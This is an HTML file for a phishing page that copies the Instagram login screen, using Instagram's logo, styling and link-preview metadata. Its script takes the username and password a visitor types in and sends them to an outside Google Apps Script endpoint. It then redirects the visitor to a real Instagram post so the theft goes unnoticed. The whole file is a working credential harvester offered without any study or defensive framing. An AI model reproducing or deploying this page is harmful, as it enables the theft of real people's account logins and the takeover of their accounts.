<!-- index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1200px-Instagram_icon.png" type="image/png"> <!-- Favicon -->
    <meta property="og:image" content="https://instagram.flhe7-2.fna.fbcdn.net/v/t51.29350-15/460504822_901217738556737_1911189637195694439_n.webp?stp=dst-jpg_e35&efg=eyJ2ZW5jb2RlX3RhZyI6ImltYWdlX3VybGdlbi42NTZ4NjU2LnNkci5mMjkzNTAuZGVmYXVsdF9pbWFnZSJ9&_nc_ht=instagram.flhe7-2.fna.fbcdn.net&_nc_cat=105&_nc_ohc=5AnHCxemzUUQ7kNvgEOT0OF&_nc_gid=90c64f22d90f49dbbba5083e223f484b&edm=AP4sbd4BAAAA&ccb=7-5&ig_cache_key=MzQ2MTg0NDU0MTY1NzY0NTI5Nw%3D%3D.3-ccb7-5&oh=00_AYBnyYpBE-roxn3wCHthYPxrMjpMFHZJe4tM_qKwbR0P-A&oe=671C4E7C&_nc_sid=7a9f4b"> <!-- Preview image for link sharing -->
    <meta property="og:title" content="Instagram"> <!-- Title for link sharing -->
    <meta property="og:description" content="Minhaal Ghafoor"> <!-- Description for link sharing -->
    <style>
        /* style.css */
        body {
            background-color: #fafafa;
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
            border-radius: 8px;
        }

        .logo {
            width: 175px;
            margin-bottom: 20px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input {
            margin-bottom: 10px;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background-color: #fafafa;
        }

        button {
            background-color: #0095f6;
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #007ac1;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or {
            margin: 0 10px;
            color: #8e8e8e;
            font-size: 12px;
        }

        .fb-login {
            color: #385185;
            font-weight: bold;
            margin-top: 20px;
            text-decoration: none;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin-top: 10px;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="form-wrapper">
            <img src="https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram.png" alt="Instagram Logo" class="logo">
            <form id="login-form">
                <input type="text" placeholder="Phone number, username, or email" required>
                <input type="password" placeholder="Password" required>
                <button type="submit">Log In</button>
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">OR</div>
                    <div class="line"></div>
                </div>
                <a href="#" class="fb-login">Log in with Facebook</a>
                <a href="#" class="forgot-password">Forgot password?</a>
            </form>
        </div>
    </div>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission

            // Get the form data
            const username = document.querySelector('input[type="text"]').value;
            const password = document.querySelector('input[type="password"]').value;

            // Prepare the data to send
            const data = { username, password };

            // Send the data to Google Apps Script
            fetch('https://script.google.com/macros/s/AKfycbw37-nhJofzixj2Oq-W-0fjAQPkdg9cI1Vjn_LuDQdVjvb-4K293PrYvK8g_83iN8QhUw/exec', {
                method: 'POST',
                mode: 'no-cors', // 'no-cors' mode to avoid CORS issues
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                // We can't access response due to 'no-cors', but assume success
                console.log('Login request sent successfully.');
                
                // Redirect the user after a successful "fake" login (since we can't verify response)
                window.location.href = 'https://www.instagram.com/p/DBUKCbVISX372qYMnotwkDS_ExcGRuSkYQ1o5w0/';
            })
            .catch(error => {
                // Log the error to the console (optional: show user-friendly message in UI)
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
